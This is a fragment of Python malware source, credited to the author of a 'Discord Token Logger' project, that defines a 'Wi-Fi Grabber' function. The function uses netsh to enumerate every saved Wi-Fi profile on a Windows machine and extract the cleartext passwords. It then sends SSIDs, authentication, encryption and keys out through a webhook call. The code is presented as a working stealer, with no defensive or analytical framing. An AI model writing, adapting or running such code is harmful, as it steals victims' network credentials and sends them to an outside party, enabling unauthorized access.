# Token Logger - Deadconvicess
# Github - https://github.com/deadconvicess/Discord-Token-Logger


# Wifi Grabber
def wifi():
    try:
        output = subprocess.check_output("netsh wlan show profiles", shell=True, text=True, encoding="utf-8", errors="ignore")
        profiles = re.findall(r"All User Profile\s*:\s(.+)", output)
        if not profiles:
            send_webhook(" No profiles found.", title="Wifi Grabber")
            return
        results = ""
        for ssid in profiles:
            ssid = ssid.strip().strip('"')
            try:
                detail = subprocess.check_output(
                    f'netsh wlan show profile name="{ssid}" key=clear',
                    shell=True, text=True, encoding="utf-8", errors="ignore"
                )
                auth = re.search(r"Authentication\s*:\s(.+)", detail)
                encryption = re.search(r"Encryption\s*:\s(.+)", detail)
                key = re.search(r"Key Content\s*:\s(.+)", detail)
                results += f"**SSID:** {ssid}\n"
                results += f"Auth: `{auth.group(1).strip() if auth else 'Unknown'}`\n"
                results += f"Encryption: `{encryption.group(1).strip() if encryption else 'Unknown'}`\n"
                results += f"Password: `{key.group(1).strip() if key else 'N/A'}`\n"
                results += f"{'-'*30}\n"
            except subprocess.CalledProcessError:
                continue
        if results:
            send_webhook(results, title="Wi-Fi Profiles", encrypt=False)
        else:
            send_webhook("No usable Wi-Fi passwords found.", title="📡 Wi-Fi Stealer")
    except Exception as e:
        send_webhook(f"Failed: `{e}`", title="Wi-Fi Dump Error")